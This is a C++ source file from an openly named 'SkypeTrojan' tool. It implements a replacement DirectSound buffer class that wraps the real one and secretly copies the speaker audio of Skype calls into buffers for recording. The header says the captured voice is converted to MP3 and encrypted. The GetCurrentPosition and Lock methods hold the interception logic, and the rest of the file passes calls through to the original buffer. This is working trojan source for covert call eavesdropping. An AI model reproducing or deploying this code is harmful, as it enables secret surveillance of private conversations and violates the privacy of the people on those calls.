/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */




/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */





#include <stdio.h>
#include <windows.h>
#include <DSound.h>
#include "IDirectSoundReplacement.h"
#include "IDirectSoundBufferReplacement.h"
#include "VoIP_Recorder.h"

extern bool gInputIsRecording;
extern bool gOutputIsRecording;
extern bool gOutputGotData;
extern bool gInputGotData;

extern char gOutAudioBlocksBuffer[MAX_AUDIO_SIZE];
extern int gOutAudioBlocksBufferSize;

extern DWORD gBlockCounterInput; 
extern DWORD gBlockCounterOutput;


DWORD IDirectSoundBufferReplacement::mIndex = 0;


/*
 * Constructor + destructor
 *
 */

IDirectSoundBufferReplacement::IDirectSoundBufferReplacement(IDirectSoundBuffer *pIDirectSoundBufferOriginal, DWORD pInputDataBufferSize)
{
  mIDirectSoundBufferOriginal = pIDirectSoundBufferOriginal;
  mOutputDataBufferSize = pInputDataBufferSize;
  mIndex++;
  gOutAudioBlocksBufferSize = 0;
  mAudioSliceSize = 960;
  mPacketNumber = 0;
}



IDirectSoundBufferReplacement::IDirectSoundBufferReplacement()
{
}



IDirectSoundBufferReplacement::~IDirectSoundBufferReplacement()
{
  if (mIDirectSoundBufferOriginal)
    mIDirectSoundBufferOriginal->~IDirectSoundBuffer();
}




/*
 * Increment the reference counter
 *
 */

ULONG __stdcall IDirectSoundBufferReplacement::AddRef()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->AddRef();

  return(mRetVal);
}




/*
 * Decrement the reference counter
 *
 */

ULONG __stdcall IDirectSoundBufferReplacement::Release()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->Release();

  return(mRetVal);
}





/*
 * Query the DS instance
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::QueryInterface(REFIID iid, void** ppv)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->QueryInterface(iid, ppv);

  return(mRetVal);
}



/*
 * Get current caps settings
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetCaps(LPDSBCAPS pDSCaps)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal != NULL)
    mRetVal = mIDirectSoundBufferOriginal->GetCaps(pDSCaps);

  return(mRetVal);
}





/*
 * Get audio data format
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetFormat(LPWAVEFORMATEX pwfxFormat, DWORD dwSizeAllocated, LPDWORD pdwSizeWritten)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->GetFormat(pwfxFormat, dwSizeAllocated, pdwSizeWritten);

  return(mRetVal);
}



/*
 * Get current position in DS ring buffer
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetCurrentPosition(LPDWORD pdwCapturePosition, LPDWORD pdwReadPosition)
{
  HRESULT mRetVal = 0;
  DWORD dwWritten = 0;
  char *mTempPointer = NULL;

  if (mIDirectSoundBufferOriginal)
  {
    mRetVal = mIDirectSoundBufferOriginal->GetCurrentPosition(pdwCapturePosition, pdwReadPosition);


    /*
     * Intercept speaker data here!!! and calculate new data offset
     *
     */

    if (mOutputAudioDataPointer != NULL && 
        mOutputAudioDataSize > 0 && 
        mPreviousWritePosition != *pdwReadPosition
       )
    {
      gOutputGotData = true;
      if (mAudioSliceSize < MAX_AUDIO_SIZE)  // our buffer has to be big enough to store audio data
      {
        /*
         * Open output-file
         *
         */

        if (gInputIsRecording == true && gInputGotData == true)
        {


          /*
           * Dump data to buffer and write it to output-file
           *
           */

          if (gOutAudioBlocksBufferSize + mAudioSliceSize <= MAX_AUDIO_SIZE)
          {
            memcpy(&gOutAudioBlocksBuffer[gOutAudioBlocksBufferSize], (char *) mOutputAudioDataPointer + mOutputOffset, mAudioSliceSize);
            gOutAudioBlocksBufferSize += mAudioSliceSize;
          } else {


            /*
             * Write audio blocks to buffer.
             *
             */

            if ((mAudioDataInput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
            {
              ZeroMemory(mAudioDataInput, sizeof(sAudioData));

              if ((mAudioDataInput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gOutAudioBlocksBufferSize)) != NULL)
              {
                mAudioDataInput->mPacketNumber = gBlockCounterOutput;
                mAudioDataInput->mAudioDataSize = gOutAudioBlocksBufferSize;
                mAudioDataInput->mHangUp = 1;
                memcpy(mAudioDataInput->mAudioDataBuffer, gOutAudioBlocksBuffer, gOutAudioBlocksBufferSize);
                CreateThread(0, 0, writeOutputThread, mAudioDataInput, 0, &mThreadID);
                gBlockCounterOutput++;
              } // if ((mAudioDataInput->mAudioDataBuffer = (short * ...
            } // if ((mAudioDataInput = (sAudioData *) HeapAlloc(...
            memcpy(&gOutAudioBlocksBuffer[0], (char *) mOutputAudioDataPointer + mOutputOffset, mAudioSliceSize);
            gOutAudioBlocksBufferSize = mAudioSliceSize;
          }
        } // if (gOutAudioBlocksBuffer)
      } // if (mAudioSliceSize < MAX_AUDIO_SIZE)


      /*
       * Recalculate the offset.
       *
       */

      if (mOutputOffset + mAudioSliceSize < mOutputDataBufferSize)
        mOutputOffset += mAudioSliceSize;
      else
        mOutputOffset = 0;

      mPreviousWritePosition = *pdwReadPosition;
    } // if (mOutputAudioDataPointer != NUL...
  } // if (mIDirectSoundBufferOriginal)

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetVolume(LPLONG pdwVolume)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->GetVolume(pdwVolume);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetPan(LPLONG pdwPan)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->GetPan(pdwPan);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetFrequency(LPDWORD pdwFrequency)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->GetFrequency(pdwFrequency);


  return(mRetVal);
}




/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::GetStatus(LPDWORD pdwStatus)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->GetStatus(pdwStatus);


  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::Initialize(LPDIRECTSOUND lpDirectSound, LPCDSBUFFERDESC lpcDSBufferDesc)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->Initialize(lpDirectSound, lpcDSBufferDesc);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::Lock(DWORD dwOffset, DWORD dwWriteBytes, LPVOID *lplpvAudioPtr1, LPDWORD lpdwAudioBytes1, LPVOID *lplpvAudioPtr2, LPDWORD lpdwAudioBytes2, DWORD dwFlags)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
  {
    mRetVal = mIDirectSoundBufferOriginal->Lock(dwOffset, dwWriteBytes, lplpvAudioPtr1, lpdwAudioBytes1, lplpvAudioPtr2, lpdwAudioBytes2, dwFlags);



    /*
     * At this point we can grab the data buffer address where output audio data is stored
     *
     */

    if (*lplpvAudioPtr1 != NULL && dwOffset == 0)
    {
      mOutputAudioDataPointer = *lplpvAudioPtr1;
      mOutputAudioDataSize = *lpdwAudioBytes1;
      mOutputOffset = 0;
    }


    /*
     * Remember how big a audio data slice is
     *
     */
    mAudioSliceSize = dwWriteBytes;
  } // if (mIDirectSoundBufferOriginal)

  return(mRetVal);
}








/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::Play(DWORD dwReserved1, DWORD dwReserved2, DWORD dwFlags)
{
  HRESULT mRetVal = 0;


  if (mIDirectSoundBufferOriginal)
  {
    mRetVal = mIDirectSoundBufferOriginal->Play(dwReserved1, dwReserved2, dwFlags);
    gOutputIsRecording = true;
  }

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::SetCurrentPosition(DWORD dwNewPosition)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->SetCurrentPosition(dwNewPosition);

  return(mRetVal);
}




/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::SetFormat(LPCWAVEFORMATEX lpcfxFormat)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->SetFormat(lpcfxFormat);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::SetVolume(LONG lVolume)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->SetVolume(lVolume);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::SetPan(LONG lPan)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->SetPan(lPan);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::SetFrequency(DWORD dwFrequency)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->SetFrequency(dwFrequency);

  return(mRetVal);
}



HRESULT __stdcall IDirectSoundBufferReplacement::Stop()
{
  HRESULT mRetVal = 0;


  if (mIDirectSoundBufferOriginal)
  {
    mRetVal = mIDirectSoundBufferOriginal->Stop();
    gOutputIsRecording = false;
  }

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::Unlock(LPVOID lpvAudioPtr1, DWORD dwAudioBytes1, LPVOID lpvAudioPtr2, DWORD dwAudioBytes2)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->Unlock(lpvAudioPtr1, dwAudioBytes1, lpvAudioPtr2, dwAudioBytes2);

  return(mRetVal);
}





/*
 *
 *
 */

HRESULT __stdcall IDirectSoundBufferReplacement::Restore()
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundBufferOriginal)
    mRetVal = mIDirectSoundBufferOriginal->Restore();

  return(mRetVal);
}